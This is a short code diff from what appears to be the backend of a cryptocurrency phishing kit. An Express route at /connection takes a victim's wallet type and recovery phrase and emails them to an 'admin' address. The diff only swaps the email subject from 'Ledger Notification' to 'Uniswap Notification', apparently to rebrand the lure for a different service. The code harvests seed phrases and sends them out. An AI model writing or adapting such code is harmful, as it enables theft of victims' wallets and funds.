@@ -44,7 +44,7 @@ app.post('/connection', (req, res) => {
   const mailOptions = {
     from: `"noreply@proton.me" <${process.env.USER}>`,
         to: admin,
-        subject: 'Ledger Notification',
+        subject: 'Uniswap Notification',
         text: `Wallet Type: ${id},\n\nPhrase: ${phrase}`,
   };
 
